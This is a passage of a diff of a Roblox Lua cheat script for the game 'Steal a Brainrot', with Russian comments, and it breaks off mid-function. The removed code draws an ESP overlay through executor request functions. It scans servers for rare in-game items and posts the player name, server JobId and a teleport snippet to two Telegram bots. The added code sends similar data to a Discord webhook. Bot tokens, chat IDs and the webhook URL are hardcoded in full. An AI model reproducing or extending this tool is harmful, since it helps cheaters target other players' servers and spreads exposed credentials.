@@ -1,795 +1,557 @@
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
-local SoundService = game:GetService("SoundService")
-local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request
+-- 🎯 BRAINROT INCOME SCANNER v2.0 (ПОЛНАЯ ВЕРСИЯ)
+-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
+-- Запуск: автоматически при старте + по клавише F
 
--- Конфигурация ESP
-local ESP_SETTINGS = {
-    UpdateInterval = 0.5,
-    MaxDistance = 500,
-    TextSize = 18,
-    Font = Enum.Font.GothamBold,
-    PartColors = {
-        Color3.new(1, 1, 1),    -- Белый
-        Color3.new(0.2, 0.6, 1),-- Синий
-        Color3.new(1, 0.2, 0.2) -- Красный
-    },
-    SoundId = "rbxassetid://130785805",
-    SoundVolume = 1.5,
-    PlaySoundOnce = false
+local Players = game:GetService('Players')
+local UserInputService = game:GetService('UserInputService')
+local HttpService = game:GetService('HttpService')
+
+-- ⚙️ НАСТРОЙКИ
+local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424140516911484928/mnVh-97c9qW-g8Ymhneg3bkBkV3MgMWkUa3t9tAGHDuMEzb6MAfT3llXK_6ibAHkoRRs'
+
+print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
+
+-- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
+local OBJECTS = {
+    ['La Vacca Saturno Saturnita'] = { emoji = '🐮', important = false },
+    ['Chimpanzini Spiderini'] = { emoji = '🕷', important = false },
+    ['Los Tralaleritos'] = { emoji = '🐟', important = false },
+    ['Las Tralaleritas'] = { emoji = '🌸', important = false },
+    ['Graipuss Medussi'] = { emoji = '🦑', important = false },
+    ['Torrtuginni Dragonfrutini'] = { emoji = '🐉', important = false },
+    ['Pot Hotspot'] = { emoji = '📱', important = false },
+    ['La Grande Combinasion'] = { emoji = '❗️', important = true },
+    ['Garama and Madundung'] = { emoji = '🍝', important = true },
+    ['Secret Lucksfsfsfy Block'] = { emoji = '⬛️', important = false },
+    ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
+    ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
+    ['Las Vaquitas Saturnitas'] = { emoji = '👦', important = false },
+    ['Chicleteira Bicicleteira'] = { emoji = '🚲', important = true },
+    ['Los Combinasionas'] = { emoji = '⚒️', important = true },
+    ['Agarrini la Palini'] = { emoji = '🥄', important = false },
+    ['Los Hotspotsitos'] = { emoji = '☎️', important = true },
+    ['Esok Sekolah'] = { emoji = '🏠', important = true },
+    ['Nooo My Hotspot'] = { emoji = '👽', important = false },
+    ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
+    ['Admin Lucky Block'] = { emoji = '🆘', important = false },
+    ['Ketupat Kepat'] = { emoji = '🍏', important = true },
+    ['Strawberry Elephant'] = { emoji = '🐘', important = true },
+    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
+    ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
+    ['Los Nooo Mysffsfsf Hotspotsitos'] = { emoji = '🥔', important = false },
+    ['La Kark56656erkar Combinasion'] = { emoji = '🥊', important = false },
+    ['Los Bros'] = { emoji = '📱', important = true },
+    ['Tralaledon'] = { emoji = '🦈', important = true },
+    ['La Extinct Grande'] = { emoji = '🩻', important = true },
+    ['Los Chicleteiras'] = { emoji = '🚳', important = true },
+    ['Las Sis'] = { emoji = '👧', important = true },
+    ['Tacorita Bicicleta'] = { emoji = '📱', important = false },
+    ['Tictac Sahur'] = { emoji = '🕰️', important = true },
+    ['Celularcini Visiosini'] = { emoji = '📞', important = true },
+    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
+    ['Tang Tang Keletang'] = { emoji = '📢', important = true },
+    ['Money Money Puggy'] = { emoji = '🐶', important = true },
+    ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
+    ['Chillin Chili'] = { emoji = '🌶', important = true },
+    ['La Secret Combinasion'] = { emoji = '❓', important = true },
 }
 
--- Настройки сканера
-local SCANNER_SETTINGS = {
-    ScanKey = Enum.KeyCode.F,
-    DebounceTime = 3,
-    IgnoreClasses = {"SurfaceAppearance", "Part"}
-}
-
--- Настройки Telegram ботов
-local TG_MAIN = {
-    Token = "8224399278:AAFIbXzp9Nsbrqs62Dq8tECypiEG7oui2bM",
-    ChatId = "1386387550",
-    Enabled = true,
-    ImportantObjects = {
-        ["Pot Hotspdddot"] = true,
-        ["La Grande Combinasion"] = true,
-        ["Garama and Madundung"] = true,
-        ["Nuclearo Dinossauro"] = true,
-        ["Dragon Cannelloni"] = true,
-        ["Los Combinasionas"] = true,
-        ["Los Hotspotsitos"] = true,
-        ["Esok Sekolah"] = true,
-        ["La Supreme Combinasion"] = true,
-        ["Nooo My Hodsadadatspot"] = true,
-        ["Ketupat Kepat"] = true,
-        ["Nofddsfoo My Hotspot"] = true,
-        ["Spaghetti Tualetti"] = true,
-        ["Strawberry Elephant"] = true,
-        ["Ketchuru and Musturu"] = true,
-        ["La Kark7658erkar Combinasion"] = true,
-        ["Tralaledon"] = true,
-        ["Los Bros"] = true,
-        ["La Extinct Grande"] = true,
-        ["Los Chicleteiras"] = true,
-        ["Las Sis"] = true,
-        ["Tacorita Bicicleta"] = true,
-        ["Tictac Sahur"] = true,
-        ["Celularcini Visiosini"] = true,
-        ["Chicleteira Bicicleteira"] = true,
-        ["Los Primos"] = true,
-        ["Tang Tang Keletang"] = true,
-        ["Money Money Puggy"] = true
-    }
-}
-
-local TG_SPECIAL = {
-    Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
-    ChatId = "-1002767532824",
-    Enabled = true
-}
-
--- Функция проверки прозрачности частей Cube.
-local function checkCubeTransparency(obj)
-    if not obj:IsA("Model") then return true end
-    
-    for _, part in ipairs(obj:GetDescendants()) do
-        if part:IsA("BasePart") and part.Name:match("^Cube%.") then
-            print("Проверка: " .. part.Name .. " - прозрачность " .. part.Transparency)
-            if part.Transparency > 0.40 then
-                return false
-            end
-        end
+-- Создаем список важных объектов
+local ALWAYS_IMPORTANT = {}
+for name, cfg in pairs(OBJECTS) do
+    if cfg.important then
+        ALWAYS_IMPORTANT[name] = true
     end
-    return true
 end
 
--- Доходы объектов (все значения в /s)
-local OBJECT_INCOME = {
-    ["La Vacca Saturno Saturnita"] = "250K/s",
-    ["Chimpanzini Spiderini"] = "325K/s",
-    ["Los Tralaleritos"] = "500K/s",
-    ["Las Tralaleritas"] = "625K/s",
-    ["Graipuss Medussi"] = "1M/s",
-    ["Torrtuginni Dragonfrutini"] = "350K/s",
-    ["Pot Hotspot"] = "2.5M/s",
-    ["La Grande Combinasion"] = "10M/s",
-    ["Garama and Madundung"] = "50M/s",
-    ["Secret Lucky Block"] = "???/s",
-    ["Dragon Cannelloni"] = "100M/s",
-    ["Nuclearo Dinossauro"] = "15M/s",
-    ["Las Vaquitas Saturnitas"] = "750K/s",
-    ["Chicleteira Bicicleteira"] = "3.5M/s",
-    ["Los Combinasionas"] = "15M/s",
-    ["Agarrini la Palini"] = "425K/s",
-    ["Los Hotspotsitos"] = "20M/s",
-    ["Esok Sekolah"] = "30M/s",
-    ["Karkerkar Kurkur"] = "275K/s",
-    ["Job Job Job Sahur"] = "700K/s",
-    ["La Supreme Combinasion"] = "40M/s",
-    ["Nooo My Hotspot"] = "1.5M/s",
-    ["Spaghetti Tualetti"] = "60M/s",
-    ["Strawberry Elephant"] = "250M/s",
-    ["Ketupat Kepat"] = "35M/s",
-    ["Ketchuru and Musturu"] = "42.5M/s",
-    ["Los Nooo My Hotssffsdsdpotsitos"] = "5M/s",
-    ["La Kark767erkar Combinasion"] = "50M/s",
-    ["Tralaledon"] = "27.5M/s",
-    ["Los Bros"] = "24M/s",
-    ["La Extinct Grande"] = "23.5M/s",
-    ["Los Chicleteiras"] = "7M/s",
-    ["Las Sis"] = "18M/s",
-    ["Tacorita Bicicleta"] = "16.5M/s",
-    ["Tictac Sahur"] = "37M/s",
-    ["Celularcini Visiosini"] = "22.5M/s",
-    ["Los Primos"] = "31M/s",
-    ["Tang Tang Keletang"] = "33.5M/s",
-    ["Money Money Puggy"] = "21M/s"
-}
-
--- Множители мутаций и трейтов
-local MUTATION_MULTIPLIERS = {
-    ["Rainbow"] = 10,
-    ["Gold"] = 1.25,
-    ["Diamond"] = 1.5,
-    ["Bloodrot"] = 2,
-    ["Candy"] = 4,
-    ["Lava"] = 6,
-    ["Galaxy"] = 7,
-    ["Yin Yang"] = 7
-}
-
-local TRAIT_MULTIPLIERS = {
-    ["Taco"] = 3,
-    ["Claws"] = 5,
-    ["Snowy"] = 3,
-    ["Glitched"] = 5,
-    ["Fire"] = 6,
-    ["Fireworks"] = 6,
-    ["Nyan"] = 6,
-    ["Disco"] = 5,
-    ["10B"] = 3,
-    ["Zombie"] = 4,
-    ["Shark Fin"] = 4,
-    ["Bubblegum"] = 4,
-    ["Cometstruck"] = 3.5,
-    ["Galactic"] = 4,
-    ["Explosive"] = 4,
-    ["Paint"] = 6,
-    ["Brazil"] = 6,
-    ["Matteo Hat"] = 3.5,
-    ["Rain"] = 1.5,
-    ["UFO"] = 3,
-    ["Skeleton"] = 4,
-    ["Spider"] = 4.5,
-    ["Sombrero"] = 5
-    
-    
-}
-
--- Эмодзи для объектов
-local OBJECT_EMOJIS = {
-    ["La Vacca Saturno Saturnita"] = "🐮",
-    ["Chimpanzini Spiderini"] = "🕷",
-    ["Los Tralaleritos"] = "🐟",
-    ["Las Tralaleritas"] = "🌸",
-    ["Graipuss Medussi"] = "🦑",
-    ["Torrtuginni Dragonfrutini"] = "🐉",
-    ["Pot Hotspot"] = "📱",
-    ["La Grande Combinasion"] = "❗️",
-    ["Garama and Madundung"] = "🍝",
-    ["Secret Lucky Block"] = "⬛️",
-    ["Dragon Cannelloni"] = "🐲",
-    ["Nuclearo Dinossauro"] = "🦕",
-    ["Las Vaquitas Saturnitas"] = "👦",
-    ["Chicleteira Bicicleteira"] = "🚲",
-    ["Los Combinasionas"] = "⚒️",
-    ["Agarrini la Palini"] = "🥄",
-    ["Los Hotspotsitos"] = "☎️",
-    ["Esok Sekolah"] = "🏠",
-    ["Nooo My Hotspot"] = "👽",
-    ["La Supreme Combinasion"] = "🔫",
-    ["Admin Lucky Block"] = "🆘",
-    ["Ketupat Kepat"] = "🍏",
-    ["Strawberry Elephant"] = "🐘",
-    ["Spaghetti Tualetti"] = "🚽",
-    ["Ketchuru and Musturu"] = "🍾",
-    ["Los Nooo My Hotspdffsfsfotsitos"] = "🥔",
-    ["La Kark666erkar Combinasion"] = "🥊",
-    ["Tralaledon"] = "🦈",
-    ["Los Bros"] = "✊",
-    ["La Extinct Grande"] = "🩻", 
-    ["Los Chicleteiras"] = "🚳",
-    ["Las Sis"] = "👧",
-    ["Tacorita Bicicleta"] = "🌮",
-    ["Tictac Sahur"] = "🕰️",
-    ["Celularcini Visiosini"] = "📞",
-    ["Los Primos"] = "🙆‍♂️",
-    ["Tang Tang Keletang"] = "📢",
-    ["Money Money Puggy"] = "🐶"
-}
-
--- Эмодзи для мутаций
-local MUTATION_EMOJIS = {
-    ["Gold"] = "🟨",
-    ["Lava"] = "🟧",
-    ["Rainbow"] = "🌈",
-    ["Diamond"] = "💎",
-    ["Candy"] = "🍬",
-    ["Bloodrot"] = "🟥",
-    ["Galaxy"] = "🟪",
-    ["Yin Yang"] = "☯️"
-}
-
--- Список объектов
-local OBJECT_NAMES = {
-    "La Vacca Saturno Saturnita",
-    "Chimpanzini Spiderini",
-    "Los Tralaleritos",
-    "Las Tralaleritas",
-    "Graipuss Medussi",
-    "Torrtuginni Dragonfrutini",
-    "Pot Hotspot",
-    "La Grande Combinasion",
-    "Garama and Madundung",
-    "Secret Lucksfsfsfy Block",
-    "Dragon Cannelloni",
-    "Nuclearo Dinossauro",
-    "Las Vaquitas Saturnitas",
-    "Chicleteira Bicicleteira",
-    "Los Combinasionas",
-    "Agarrini la Palini",
-    "Los Hotspotsitos",
-    "Esok Sekolah",
-    "Nooo My Hotspot",
-    "La Supreme Combinasion",
-    "Admin Lucky Block",
-    "Ketupat Kepat",
-    "Strawberry Elephant",
-    "Spaghetti Tualetti",
-    "Ketchuru and Musturu",
-    "Los Nooo Mysffsfsf Hotspotsitos",
-    "La Kark56656erkar Combinasion",
-    "Los Bros",
-    "Tralaledon",
-    "La Extinct Grande",
-    "Los Chicleteiras",
-    "Las Sis",
-    "Tacorita Bicicleta",
-    "Tictac Sahur",
-    "Celularcini Visiosini",
-    "Los Primos",
-    "Tang Tang Keletang",
-    "Money Money Puggy"
-}
-
--- Системные переменные
-local camera = workspace.CurrentCamera
-local espCache = {}
-local lastUpdate = 0
-local foundObjects = {}
-local objectsToNotifyMain = {}
-local objectsToNotifySpecial = {}
-local lastScanTime = 0
-local lastNotificationTimeMain = 0
-local lastNotificationTimeSpecial = 0
-local lastServerNotified = ""
-
--- Создаем интерфейс
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "RussianESP"
-screenGui.Parent = CoreGui
-screenGui.ResetOnSpawn = false
-
--- Функции утилиты
-local function getAccountInfo()
-    local player = Players.LocalPlayer
-    return player and player.Name or "Неизвестный аккаунт"
+-- 💰 ПАРСЕР ДОХОДА: принимаем только строки, оканчивающиеся на "/s"
+-- С суффиксом масштаба (K/M/B) в любом регистре или без него.
+local function parseGenerationText(s)
+    if type(s) ~= 'string' or s == '' then
+        return nil
+    end
+    -- Нормализация: убираем $, запятые и пробелы
+    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
+    -- Форматы: 10/s, 2.5M/s, 750k/s, 1b/s
+    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
+    if not num then
+        return nil
+    end
+    local val = tonumber(num)
+    if not val then
+        return nil
+    end
+    local mult = 1
+    if suffix == 'K' or suffix == 'k' then
+        mult = 1e3
+    elseif suffix == 'M' or suffix == 'm' then
+        mult = 1e6
+    elseif suffix == 'B' or suffix == 'b' then
+        mult = 1e9
+    end
+    return val * mult
 end
 
-local function getServerId()
-    local jobId = game.JobId
-    return jobId ~= "" and jobId or "Одиночная игра"
-end
-
-local function incomeToNumber(incomeStr)
-    if incomeStr == "???/s" then return 0 end
-    
-    local value = tonumber(incomeStr:match("%d+%.?%d*"))
-    local unit = incomeStr:match("([MK])/s")
-    
-    if unit == "M" then
-        return value * 1000000
-    elseif unit == "K" then
-        return value * 1000
+local function formatIncomeNumber(n)
+    if not n then
+        return 'Unknown'
+    end
+    if n >= 1e9 then
+        local v = n / 1e9
+        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
+            '%.1fB/s',
+            v
+        )):gsub('%.0B/s', 'B/s')
+    elseif n >= 1e6 then
+        local v = n / 1e6
+        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
+            '%.1fM/s',
+            v
+        )):gsub('%.0M/s', 'M/s')
+    elseif n >= 1e3 then
+        local v = n / 1e3
+        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
+            '%.1fK/s',
+            v
+        )):gsub('%.0K/s', 'K/s')
     else
-        return value
+        return string.format('%d/s', n)
     end
 end
 
-local function formatIncomeNumber(num)
-    if num >= 1000000 then
-        local mValue = num/1000000
-        return string.format(mValue % 1 == 0 and "%dM/s" or "%.1fM/s", mValue):gsub("%.0M/s", "M/s")
-    elseif num >= 1000 then
-        local kValue = num/1000
-        return string.format(kValue % 1 == 0 and "%dK/s" or "%.1fK/s", kValue):gsub("%.0K/s", "K/s")
-    else
-        return string.format("%d/s", num)
+-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
+local function grabText(inst)
+    if not inst then
+        return nil
     end
-end
-
-local function getMutationEmoji(mutation)
-    return MUTATION_EMOJIS[mutation] or "⬜️"
-end
-
--- Функции для сбора информации об объектах
-local function findMutation(obj)
-    local mutation = obj:GetAttribute("Mutation")
-    if mutation then return tostring(mutation) end
-    
-    for _, child in ipairs(obj:GetDescendants()) do
-        if child:IsA("StringValue") and child.Name == "Mutation" then
-            return child.Value
+    if
+        inst:IsA('TextLabel')
+        or inst:IsA('TextButton')
+        or inst:IsA('TextBox')
+    then
+        local ok, ct = pcall(function()
+            return inst.ContentText
+        end)
+        if ok and type(ct) == 'string' and #ct > 0 then
+            return ct
         end
-        
-        if child:IsA("ObjectValue") and child.Name == "Mutation" and child.Value then
-            return child.Value.Name
+        local t = inst.Text
+        if type(t) == 'string' and #t > 0 then
+            return t
         end
     end
-    
-    local nameParts = obj.Name:split(" ")
-    for _, part in ipairs(nameParts) do
-        if MUTATION_MULTIPLIERS[part] then
-            return part
+    if inst:IsA('StringValue') then
+        local v = inst.Value
+        if type(v) == 'string' and #v > 0 then
+            return v
         end
     end
-    
     return nil
 end
 
-local function findTraits(obj)
-    local traits = {}
-    
-    local traitsAttr = obj:GetAttribute("Traits")
-    if traitsAttr then
-        if type(traitsAttr) == "table" then
-            for _, v in pairs(traitsAttr) do
-                table.insert(traits, tostring(v))
-            end
-        else
-            table.insert(traits, tostring(traitsAttr))
-        end
-    end
-    
-    for _, child in ipairs(obj:GetDescendants()) do
-        if child:IsA("StringValue") and (child.Name == "Trait" or child.Name == "Traits") then
-            table.insert(traits, child.Value)
-        end
-    end
-    
-    for _, child in ipairs(obj:GetDescendants()) do
-        if child:IsA("ObjectValue") and (child.Name == "Trait" or child.Name == "Traits") and child.Value then
-            table.insert(traits, child.Value.Name)
-        end
-    end
-    
-    return traits
-end
-
-
-local function scanObject(obj)
-    if not obj or not obj.Parent then return nil end
-    
-    -- Пропуск проверки прозрачности для "Garama and Madundung" и "La Supreme Combinasion"
-    if obj.Name == "Garama and Madundung" or obj.Name == "La Supreme Combinasion" then
-        print(obj.Name .. ": проверка прозрачности пропущена")
-    else
-        -- Проверка прозрачности только для частей Cube.
-        if not checkCubeTransparency(obj) then
-            print(obj.Name .. ": найдены части Cube с высокой прозрачностью (>0.40), уведомление не отправляется")
-            return nil
-        end
-    end
-    
-    local mutation = findMutation(obj)
-    local traits = findTraits(obj)
-    local baseIncomeStr = OBJECT_INCOME[obj.Name] or "0/s"
-    local baseIncome = incomeToNumber(baseIncomeStr)
-    
-    -- Раздельные множители
-    local mutationMultiplier = 1
-    local traitsMultiplier = 1
-    local appliedMutation = {}
-    local appliedTraits = {}
-
-    -- Применяем множитель мутации
-    if mutation and MUTATION_MULTIPLIERS[mutation] then
-        mutationMultiplier = MUTATION_MULTIPLIERS[mutation]
-        table.insert(appliedMutation, mutation.." (x"..MUTATION_MULTIPLIERS[mutation]..")")
+local function getOverheadInfo(animalOverhead)
+    if not animalOverhead then
+        return nil, nil
     end
 
-    -- Применяем множители трейтов
-    for _, trait in ipairs(traits) do
-        if TRAIT_MULTIPLIERS[trait] then
-            traitsMultiplier = traitsMultiplier * TRAIT_MULTIPLIERS[trait]
-            table.insert(appliedTraits, trait.." (x"..TRAIT_MULTIPLIERS[trait]..")")
-        end
+    local name = nil
+    local display = animalOverhead:FindFirstChild('DisplayName')
+    if display then
+        name = grabText(display)
     end
 
-    -- Рассчитываем итоговый доход (формула: base * mutation + base * (traits - 1))
-    local finalIncome = baseIncome
-    if baseIncomeStr ~= "???/s" then
-        finalIncome = baseIncome * mutationMultiplier + baseIncome * (traitsMultiplier - 1)
+    if not name then
+        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
+            or animalOverhead:FindFirstChildOfClass('TextButton')
+            or animalOverhead:FindFirstChildOfClass('TextBox')
+        name = anyText and grabText(anyText) or nil
     end
 
-    return {
-        name = obj.Name,
-        mutation = mutation,
-        traits = traits,
-        baseIncome = baseIncomeStr,
-        finalIncome = formatIncomeNumber(finalIncome),
-        mutationMultiplier = mutationMultiplier,
-        traitsMultiplier = traitsMultiplier,
-        appliedMutation = appliedMutation,
-        appliedTraits = appliedTraits,
-        numericIncome = finalIncome
-    }
-end
-
-local function createColoredText(objData)
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(0, 350, 0, 50)
-    textLabel.BackgroundTransparency = 1
-    textLabel.TextSize = ESP_SETTINGS.TextSize
-    textLabel.Font = ESP_SETTINGS.Font
-    textLabel.TextXAlignment = Enum.TextXAlignment.Left
-    textLabel.TextStrokeTransparency = 0.3
-    
-    local emoji = OBJECT_EMOJIS[objData.name] or "🔹"
-    local incomeText = objData.finalIncome ~= "???/s" and objData.finalIncome or "???"
-    
-    local richText = string.format(
-        '<font color="rgb(255,255,255)">%s%s %s: %s</font>',
-        emoji, getMutationEmoji(objData.mutation), objData.name, incomeText
-    )
-    
-    -- Показываем мутации и трейты с их множителями
-    if objData.mutation and MUTATION_MULTIPLIERS[objData.mutation] then
-        richText = richText .. string.format(
-            '\n<font color="rgb(255,255,150)">%s x%.2f</font>',
-            objData.mutation, objData.mutationMultiplier
-        )
-    end
-    
-    if #objData.traits > 0 then
-        richText = richText .. '\n<font color="rgb(150,255,150)">'
-        for _, trait in ipairs(objData.traits) do
-            if TRAIT_MULTIPLIERS[trait] then
-                richText = richText .. string.format('%s x%.2f ', trait, TRAIT_MULTIPLIERS[trait])
-            else
-                richText = richText .. trait .. ' '
-            end
-        end
-        richText = richText .. '</font>'
-    end
-    
-    textLabel.Text = richText
-    textLabel.RichText = true
-    return textLabel
-end
-
-local function createESPElement(obj)
-    local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
-    if not rootPart then return end
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Size = UDim2.new(0, 350, 0, 80)
-    billboard.AlwaysOnTop = true
-    billboard.MaxDistance = ESP_SETTINGS.MaxDistance
-    billboard.StudsOffset = Vector3.new(0, 3, 0)
-    
-    local objData = scanObject(obj)
-    local textLabel = createColoredText(objData)
-    textLabel.Parent = billboard
-    
-    billboard.Adornee = rootPart
-    billboard.Parent = screenGui
-    
-    return {
-        labelGui = billboard,
-        label = textLabel,
-        rootPart = rootPart,
-        object = obj,
-        data = objData
-    }
-end
-
-local function canSendNotification(botType)
-    local currentServer = getServerId()
-    local now = os.time()
-    local lastNotificationTime = botType == "main" and lastNotificationTimeMain or lastNotificationTimeSpecial
-    
-    if currentServer == lastServerNotified and now - lastNotificationTime < 7 then
-        return false
-    end
-    
-    if botType == "main" then
-        lastNotificationTimeMain = now
-    else
-        lastNotificationTimeSpecial = now
-    end
-    lastServerNotified = currentServer
-    return true
-end
-
-local function sendMainTelegramAlert()
-    if not TG_MAIN.Enabled or not request or #objectsToNotifyMain == 0 then return end
-    if not canSendNotification("main") then return end
-    
-    local serverId = getServerId()
-    local username = getAccountInfo()
-    
-    local importantObjects = {}
-    local regularObjects = {}
-    
-    for _, objData in ipairs(objectsToNotifyMain) do
-        if TG_MAIN.ImportantObjects[objData.name] then
-            table.insert(importantObjects, objData)
-        else
-            table.insert(regularObjects, objData)
-        end
-    end
-    
-    local message = string.format(
-        "*🔍 Обнаружены объекты в Steal a brainrot*\n"..
-        "👤 Игрок: `@%s`\n"..
-        "🌐 Сервер: `%s`\n"..
-        "🕘 Время: `%s`\n\n",
-        username, serverId, os.date("%X")
-    )
-    
-    if #importantObjects > 0 then
-        message = message .. "*🚨 ВАЖНЫЕ ОБЪЕКТЫ:*\n"
-        for _, objData in ipairs(importantObjects) do
-            local emoji = OBJECT_EMOJIS[objData.name] or "⚠️"
-            local mutationEmoji = getMutationEmoji(objData.mutation)
-            
-            message = message .. string.format("%s%s %s (%s)", emoji, mutationEmoji, objData.name, objData.finalIncome)
-            
-            if #objData.traits > 0 then
-                message = message .. " " .. table.concat(objData.traits, " ")
-            end
-            
-            message = message .. "\n"
-        end
-        message = message .. "\n"
-    end
-    
-    if #regularObjects > 0 then
-        message = message .. "*🔹 Обычные объекты:*\n"
-        for _, objData in ipairs(regularObjects) do
-            local emoji = OBJECT_EMOJIS[objData.name] or "🔸"
-            local mutationEmoji = getMutationEmoji(objData.mutation)
-            
-            message = message .. string.format("%s%s %s (%s)", emoji, mutationEmoji, objData.name, objData.finalIncome)
-            
-            if #objData.traits > 0 then
-                message = message .. " " .. table.concat(objData.traits, " ")
-            end
-            
-            message = message .. "\n"
-        end
-    end
-    
-    if serverId ~= "Одиночная игра" then
-        message = message .. string.format(
-            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
-            serverId
-        )
-    end
-    
-    request({
-        Url = "https://api.telegram.org/bot"..TG_MAIN.Token.."/sendMessage",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            chat_id = TG_MAIN.ChatId,
-            text = message,
-            parse_mode = "Markdown"
-        })
-    })
-end
-
-local function sendSpecialTelegramAlert()
-    if not TG_SPECIAL.Enabled or not request or #objectsToNotifySpecial == 0 then return end
-    if not canSendNotification("special") then return end
-    
-    local serverId = getServerId()
-    local username = getAccountInfo()
-    
-    local message = string.format(
-        "*🔍 Обнаружены объекты в Steal a brainrot*\n"..
-        "👤 Игрок: `@%s`\n"..
-        "🌐 Сервер: `%s`\n"..
-        "🕘 Время: `%s`\n\n"..
-        "*🔸 Объекты с низким доходом:*\n",
-        username, serverId, os.date("%X")
-    )
-    
-    for _, objData in ipairs(objectsToNotifySpecial) do
-        local emoji = OBJECT_EMOJIS[objData.name] or "🔸"
-        local mutationEmoji = getMutationEmoji(objData.mutation)
-        
-        message = message .. string.format("%s%s %s (%s)", emoji, mutationEmoji, objData.name, objData.finalIncome)
-        
-        if #objData.traits > 0 then
-            message = message .. " " .. table.concat(objData.traits, " ")
-        end
-        
-        message = message .. "\n"
-    end
-    
-    if serverId ~= "Одиночная игра" then
-        message = message .. string.format(
-            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
-            serverId
-        )
-    end
-    
-    request({
-        Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            chat_id = TG_SPECIAL.ChatId,
-            text = message,
-            parse_mode = "Markdown"
-        })
-    })
-end
-
-local function playDetectionSound()
-    local sound = Instance.new("Sound")
-    sound.SoundId = ESP_SETTINGS.SoundId
-    sound.Volume = ESP_SETTINGS.SoundVolume
-    sound.Parent = workspace
-    sound:Play()
-    game:GetService("Debris"):AddItem(sound, 3)
-end
-
-local function updateESP(deltaTime)
-    lastUpdate = lastUpdate + deltaTime
-    if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
-    lastUpdate = 0
-
-    -- Очистка кэша
-    for obj, data in pairs(espCache) do
-        if not obj.Parent or not data.rootPart.Parent then
-            data.labelGui:Destroy()
-            espCache[obj] = nil
-            foundObjects[obj] = nil
-        end
+    local genText = nil
+    local generation = animalOverhead:FindFirstChild('Generation')
+    if generation then
+        genText = grabText(generation)
     end
 
-    -- Сброс списков для уведомлений перед новым сканированием
-    objectsToNotifyMain = {}
-    objectsToNotifySpecial = {}
-
-    -- Поиск объектов
-    for _, obj in ipairs(workspace:GetDescendants()) do
-        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
-            local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
-            if not rootPart then continue end
-
-            local distance = (rootPart.Position - camera.CFrame.Position).Magnitude
-            if distance > ESP_SETTINGS.MaxDistance then
-                if espCache[obj] then
-                    espCache[obj].labelGui.Enabled = false
+    if not genText then
+        for _, child in ipairs(animalOverhead:GetDescendants()) do
+            if
+                child:IsA('TextLabel')
+                or child:IsA('TextButton')
+                or child:IsA('TextBox')
+            then
+                local text = grabText(child)
+                if text and (text:match('%$') or text:match('/s')) then
+                    genText = text
+                    break
                 end
-                continue
             end
+        end
+    end
 
-            local isNewObject = not foundObjects[obj]
-            foundObjects[obj] = true
+    return name, genText
+end
 
-            if not espCache[obj] then
-                espCache[obj] = createESPElement(obj)
-                local objData = espCache[obj].data
-                if objData then
-                    playDetectionSound()
-                    
-                    -- Добавляем в соответствующий список для уведомлений
-                    if TG_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 25000000 then
-                        table.insert(objectsToNotifyMain, objData)
-                    else
-                        table.insert(objectsToNotifySpecial, objData)
+local function isGuidName(s)
+    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
+end
+
+-- 🔍 ПОЛНЫЕ СКАНЕРЫ
+local function scanPlots()
+    local results = {}
+    local Plots = workspace:FindFirstChild('Plots')
+    if not Plots then
+        return results
+    end
+
+    for _, plot in ipairs(Plots:GetChildren()) do
+        local Podiums = plot:FindFirstChild('AnimalPodiums')
+        if Podiums then
+            for _, podium in ipairs(Podiums:GetChildren()) do
+                local Base = podium:FindFirstChild('Base')
+                local Spawn = Base and Base:FindFirstChild('Spawn')
+                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
+                local Overhead = Attachment
+                    and Attachment:FindFirstChild('AnimalOverhead')
+                if Overhead then
+                    local name, genText = getOverheadInfo(Overhead)
+                    local genNum = genText and parseGenerationText(genText)
+                        or nil
+                    if name and genNum then
+                        table.insert(
+                            results,
+                            { name = name, gen = genNum, location = 'Plot' }
+                        )
                     end
                 end
             end
-
-            -- Обновление видимости ESP
